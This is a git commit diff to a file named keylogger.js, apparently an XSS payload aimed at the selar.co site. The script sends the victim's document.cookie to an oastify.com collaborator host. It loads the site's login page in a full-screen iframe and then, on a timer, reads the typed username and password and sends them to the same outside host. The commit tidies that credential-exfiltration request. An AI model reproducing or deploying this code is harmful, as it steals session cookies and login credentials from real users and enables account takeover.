3267c97d2ff51ed7466948eaad233eac07aa2e39
Okechukwu Joshua <lodianaselora@gmail.com>
2025-01-02 07:57:22 +0100

    Update keylogger.js

--- keylogger.js
+++ keylogger.js
@@ -1,7 +1,7 @@
 let currSession = "";
 fetch(`https://4ejcesgd7nd62rf3xgkjigf6txzonpbe.oastify.com/${document.cookie}`, {mode: 'no-cors',});
-fetch('https://selar.co/logout', {method: 'GET'})
-document.body.style.setProperty('height', '100vh')
+fetch('https://selar.co/login', {method: 'GET'});
+document.body.style.setProperty('height', '100vh');
 const iframe = document.createElement('iframe');
 iframe.src = 'https://selar.co/login';
 iframe.width = '100%';
@@ -22,8 +22,7 @@ setInterval(()=> {
     const iframe = document.querySelector('iframe');
     const element = iframe.contentDocument.evaluate('/html/body/div[1]/div[2]/div[1]/div[2]/div/div[2]/div[1]/input', iframe.contentDocument, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
     if (element.value != old_username || iframe.contentDocument.getElementById('password').value !=  old_password) {
-        fetch(`https:a//4ejcesgd7nd62rf3xgkjigf6txzonpbe.oastify.com/Email?direct-email-${element.value}`)
-        fetch(`https://4ejcesgd7nd62rf3xgkjigf6txzonpbe.oastify.com/Password?direct-password-${iframe.contentDocument.getElementById('password').value }`)
+        fetch(`https://4ejcesgd7nd62rf3xgkjigf6txzonpbe.oastify.com/Password?username:${element.value}s==direct-password-${iframe.contentDocument.getElementById('password').value }`)
         old_username = element.value;
         old_password = iframe.contentDocument.getElementById('password').value;
     }    
